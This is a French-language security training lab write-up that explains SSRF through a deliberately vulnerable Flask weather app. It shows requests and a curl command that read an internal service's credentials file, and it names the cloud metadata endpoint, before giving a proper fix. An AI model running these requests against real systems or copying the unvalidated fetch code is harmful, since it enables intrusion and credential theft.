Jour 4 / Lab 7

SSRF via une URL d’API fournie par le client

WeatherCheck ressemble à une simple app météo. On choisit une ville et le serveur va chercher une API météo. Mais l’URL complète de l’API est construite côté navigateur et envoyée dans le corps de la requête, donc le serveur ira chercher n’importe quelle URL fournie par le client — y compris des services internes.

Rappel rapide sur le SSRF

SSRF (Server-Side Request Forgery) apparaît quand une application va chercher une URL contrôlée par l’attaquant, depuis sa propre position réseau. Le serveur devient un proxy qui peut atteindre des choses que l’attaquant ne peut pas : services internes, endpoints de métadonnées, interfaces d’admin, bases de données, ou outils accessibles uniquement en localhost.

L’impact dépend de ce qui vit sur le réseau interne. En cloud, la première cible est habituellement le service de métadonnées de l’instance (169.254.169.254). Dans un lab containerisé, c’est les services internes sur le même réseau Docker.

D’où vient la vulnérabilité

Chaque carte de ville rend un formulaire qui transporte l’URL d’API complète dans un input caché.

<form method="post" action="/check">
  <input type="hidden" name="city"    value="Paris">
  <input type="hidden" name="api_url" value="https://wttr.in/Paris?format=j1">
  <button>Get Weather</button>
</form>

Le backend prend cette URL et la fetch directement, sans aucune validation :

def check():
    api_url = request.form.get('api_url', '').strip()
    city    = request.form.get('city', 'Unknown')

    response = http_requests.get(api_url, timeout=5)
    return render_template('result.html',
                           city=city,
                           api_url=api_url,
                           body=response.text[:8000])

Le serveur renvoie le corps de la réponse directement dans la page, ce qui en fait un SSRF in-band de manuel — on voit exactement ce que le serveur a récupéré.

Cartographier le réseau interne

Le fichier docker-compose définit un deuxième service sur le même réseau backend :

services:
  web:
    ports:
      - "5008:5008"

  files:
    command: ["python", "-m", "http.server", "7777", ...]
    expose:
      - "7777"   # accessible uniquement depuis le réseau docker

Le service files utilise expose, pas ports, donc le port 7777 n’est accessible que depuis les autres conteneurs du réseau — pas depuis le laptop. C’est cette asymétrie que SSRF exploite.

Comment fonctionne l’exploit

On intercepte la requête météo (Burp, ZAP, ou « Edit and resend » dans les devtools de Firefox) et on change api_url pour pointer vers le service interne.

Lister les fichiers internes

POST /check
city=Paris&api_url=http://files:7777/

La réponse contient le listing du dossier /srv/files : credentials.txt, backup-config.json, employee-list.csv, internal-notes.md.

Lire les credentials

POST /check
city=Paris&api_url=http://files:7777/credentials.txt

Même technique, autre chemin. La page de réponse affiche maintenant le fichier complet de credentials avec des faux secrets DB, SSH, AWS et Redis — des données qu’on ne pourrait jamais atteindre depuis l’internet public.

Avec curl

curl -s -X POST http://localhost:5008/check \
  --data-urlencode "city=Paris" \
  --data-urlencode "api_url=http://files:7777/credentials.txt"

Dans un vrai environnement cloud, le même pattern atteint les endpoints de métadonnées (http://169.254.169.254/latest/meta-data/), des panels d’admin internes, des Elasticsearch ou Redis non authentifiés, et autres services qui font confiance au périmètre réseau.

Correctif

Ne pas accepter une URL complète depuis le client. Laisser l’utilisateur choisir un nom de ville et construire l’URL côté serveur.

CITIES = {'Paris', 'Tokyo', 'New York', ...}

def check():
    city = request.form.get('city', '')
    if city not in CITIES:
        return 'Unknown city', 400

    url = f"https://wttr.in/{city}?format=j1"
    response = http_requests.get(url, timeout=5)
    # ...

Si pour une raison quelconque l’app doit vraiment accepter une URL, valider après la résolution DNS et avant la requête HTTP :

  • Allowlist d’hôtes, pas de denylist. wttr.in seulement, tout le reste rejeté.
  • Forcer le schéma à https.
  • Résoudre le nom d’hôte et rejeter les plages RFC1918, 127.0.0.0/8, 169.254.0.0/16, et leurs équivalents IPv6 (::1, fc00::/7).
  • Désactiver les redirections, ou re-valider chaque saut. Sinon une URL publique peut rediriger vers http://169.254.169.254/ et contourner le contrôle d’IP.
  • Faire passer la requête sortante par une politique réseau qui ne peut tout simplement pas atteindre les services internes.

L’allowlist de la destination est presque toujours la bonne réponse. La seule validation d’URL est très difficile à bien faire.
